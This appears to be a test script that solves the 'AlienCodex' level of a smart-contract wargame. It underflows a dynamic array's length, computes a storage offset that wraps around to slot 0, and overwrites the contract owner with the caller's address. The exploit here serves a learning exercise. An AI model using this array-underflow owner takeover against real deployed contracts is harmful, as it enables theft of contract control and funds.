const { expect } = require("chai");
const { createChallenge, submitLevel } = require("./utils");

async function getChallenge() {
  const factory = await ethers.getContractFactory("AlienCodex");
  const challengeAddress = await createChallenge(`0x0BC04aa6aaC163A6B3667636D798FA053D43BD11`)
  const challenge = factory.attach(challengeAddress);
  return challenge;
}

it("Solves 19-AlienCodex", async function () {
  const challenge = await getChallenge();

  const [eoa] = await ethers.getSigners();
  const userAddress = await eoa.getAddress();

  await challenge.makeContact();
  await challenge.retract();

  // Array data is stored in keccak256(p), keccak256(p)+1, keccak256(p)+2, ... where p is the allocated slot
  // in the order of variable declatarion (padded to 32 bytes).
  // https://docs.soliditylang.org/en/v0.8.23/internals/layout_in_storage.html#mappings-and-dynamic-arrays
  const startingPosition = BigInt(ethers.solidityPackedKeccak256(["uint256"], [1]));
  const delta = 2n**256n - startingPosition;
  const addressBytes32 = ethers.AbiCoder.defaultAbiCoder().encode(["address"], [userAddress]);
  await challenge.revise(delta, addressBytes32);

  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});
